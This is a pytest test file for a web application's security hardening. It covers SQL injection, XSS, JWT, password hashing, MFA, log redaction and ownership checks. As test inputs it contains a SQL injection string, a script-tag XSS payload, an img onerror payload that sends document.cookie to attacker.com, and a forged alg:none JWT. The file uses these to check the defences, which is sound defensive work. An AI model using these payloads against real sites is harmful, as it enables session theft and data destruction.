"""Unit and integration tests for security hardening pass.

Validates:
1. SQL injection prevention via ORM parameterization
2. XSS text sanitization via bleach
3. CSRF protection and token validation
4. Broken Object Level Authorization (BOLA) / Ownership checks
5. Rate limiting with 429 and Retry-After header
6. JWT algorithm pinning (HS256 only) and expiration enforcement
7. Bcrypt password hashing and verification
8. Multi-Factor Authentication (TOTP pyotp setup and verify)
9. Defense-in-depth HTTP security headers
10. Sensitive data log redaction
"""

from __future__ import annotations

import logging
from decimal import Decimal
from uuid import uuid4

import pyotp
import pytest
from fastapi import HTTPException
from jose import JWTError
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import Settings
from app.events.service import EventService
from app.shared.contracts import EventStatus, EventType
from app.shared.logging import SensitiveDataRedactor
from app.shared.models import Event as EventModel
from app.shared.models import User as UserModel
from app.shared.sanitizer import sanitize_text
from app.users.utils import (
    create_access_token,
    decode_token,
    hash_password,
    verify_password,
)

# ==============================================================================
# 1. SQL Injection Prevention Tests
# ==============================================================================


@pytest.mark.asyncio
async def test_sql_injection_safe_parameterization(db_session: AsyncSession) -> None:
    """SQLAlchemy select statement parameterizes user inputs, preventing SQL injection."""
    malicious_input = "Summer Gala'; DROP TABLE users; --"

    # Parameterized select executes safely without query syntax error
    stmt = select(EventModel).where(EventModel.title == malicious_input)
    result = await db_session.execute(stmt)
    assert result.scalar_one_or_none() is None


# ==============================================================================
# 2. XSS Protection Tests
# ==============================================================================


def test_xss_sanitization_strips_script_tags() -> None:
    """XSS attack payloads with script tags are completely stripped."""
    payload = "<script>alert('xss')</script>Annual Tech Conference"
    cleaned = sanitize_text(payload)
    assert cleaned == "alert('xss')Annual Tech Conference"
    assert "<script>" not in (cleaned or "")


def test_xss_sanitization_strips_event_handlers() -> None:
    """XSS inline event handlers and malicious img/svg tags are neutralized."""
    payload = "<img src=x onerror=\"fetch('http://attacker.com?c='+document.cookie)\">Wedding Gala"
    cleaned = sanitize_text(payload)
    assert cleaned == "Wedding Gala"
    assert "onerror" not in (cleaned or "")
    assert "<img" not in (cleaned or "")


def test_xss_sanitization_preserves_clean_text() -> None:
    """Clean plain text remains intact with safe entity encoding."""
    clean_text = "50th Birthday Party in Downtown Loft and Terrace"
    cleaned = sanitize_text(clean_text)
    assert cleaned == clean_text


# ==============================================================================
# 3. Bcrypt Password Hashing Tests
# ==============================================================================


def test_password_hashing_and_verification() -> None:
    """Password hashing generates salted bcrypt strings and verifies correctly."""
    raw_password = "SuperSecurePassword123!@#"
    hashed = hash_password(raw_password)

    assert hashed != raw_password
    assert hashed.startswith("$2b$") or hashed.startswith("$2a$")

    # Correct password succeeds
    assert verify_password(raw_password, hashed) is True

    # Wrong password fails
    assert verify_password("WrongPassword456!", hashed) is False


# ==============================================================================
# 4. JWT Algorithm Pinning & Expiration Tests
# ==============================================================================


def test_jwt_token_decoding_pins_hs256() -> None:
    """JWT tokens signed with HS256 decode successfully."""
    user_id = uuid4()
    token = create_access_token(user_id=user_id, email="sec_test@example.com")

    payload = decode_token(token)
    assert payload["sub"] == str(user_id)
    assert payload["type"] == "access"
    assert payload["iss"] == "eventwise"
    assert payload["aud"] == "eventwise-api"


def test_jwt_rejects_none_algorithm() -> None:
    """JWT decode rejects tokens with alg='none' (algorithm confusion defense)."""
    import base64

    # Hand-craft an unsigned JWT with alg: "none"
    header_b64 = (
        base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    )
    payload_b64 = (
        base64.urlsafe_b64encode(b'{"sub":"test-user","exp":9999999999}')
        .rstrip(b"=")
        .decode()
    )
    forged_token = f"{header_b64}.{payload_b64}."

    with pytest.raises(JWTError):
        decode_token(forged_token)


def test_production_fails_on_weak_jwt_secret() -> None:
    """Application configuration crashes in production if JWT_SECRET is default or weak."""
    with pytest.raises(ValueError, match="FATAL SECURITY CONFIGURATION"):
        Settings(
            app_env="production",
            jwt_secret="change-me",
            cors_origins=["https://eventwise.com"],
        )

    with pytest.raises(ValueError, match="FATAL SECURITY CONFIGURATION"):
        Settings(
            app_env="production",
            jwt_secret="short-key",
            cors_origins=["https://eventwise.com"],
        )


def test_production_fails_on_wildcard_cors() -> None:
    """Application configuration crashes in production if CORS origins contain '*'."""
    with pytest.raises(ValueError, match="CORS origins cannot contain wildcard"):
        Settings(
            app_env="production",
            jwt_secret="a" * 32,
            cors_origins="*",
        )


# ==============================================================================
# 5. Multi-Factor Authentication (MFA with pyotp) Tests
# ==============================================================================


def test_totp_mfa_flow() -> None:
    """TOTP MFA setup generates valid base32 secret and verifies 6-digit code."""
    secret = pyotp.random_base32()
    assert len(secret) == 32

    totp = pyotp.TOTP(secret)
    current_code = totp.now()
    assert len(current_code) == 6
    assert current_code.isdigit()

    # Valid code verifies True
    assert totp.verify(current_code) is True

    # Bad code verifies False
    assert totp.verify("000000" if current_code != "000000" else "999999") is False


# ==============================================================================
# 6. Sensitive Data Log Redaction Tests
# ==============================================================================


def test_sensitive_data_redactor_masks_credentials() -> None:
    """SensitiveDataRedactor masks passwords, bearer tokens, and secrets."""
    redactor = SensitiveDataRedactor()
    record = logging.LogRecord(
        name="test",
        level=logging.INFO,
        pathname="test.py",
        lineno=1,
        msg="Login failed for user with password='SuperSecretPassword123' and bearer eyJhbGciOiJIUzI1NiJ9.test",
        args=(),
        exc_info=None,
    )

    redactor.filter(record)
    assert "SuperSecretPassword123" not in record.msg
    assert "eyJhbGciOiJIUzI1NiJ9.test" not in record.msg
    assert "[REDACTED]" in record.msg


# ==============================================================================
# 7. BOLA Ownership Enforcement Tests
# ==============================================================================


@pytest.mark.asyncio
async def test_bola_cross_tenant_access_denied(db_session: AsyncSession) -> None:
    """User A cannot access or mutate resources owned by User B."""
    from datetime import UTC, datetime

    user_a = UserModel(
        email="victim_a@example.com",
        hashed_password=hash_password("Password123!"),
        full_name="User A",
    )
    user_b = UserModel(
        email="attacker_b@example.com",
        hashed_password=hash_password("Password123!"),
        full_name="User B",
    )
    db_session.add_all([user_a, user_b])
    await db_session.flush()

    event = EventModel(
        title="Confidential Corporate Strategy",
        owner_id=user_a.id,
        event_type=EventType.CONFERENCE,
        status=EventStatus.CONFIRMED,
        start_date=datetime.now(UTC),
        end_date=datetime.now(UTC),
        total_budget=Decimal("50000.00"),
    )
    db_session.add(event)
    await db_session.flush()

    # User B attempting to read User A's event raises 404
    with pytest.raises(HTTPException) as exc_info:
        await EventService.get_event(db_session, user_b, event.id)

    assert exc_info.value.status_code == 404
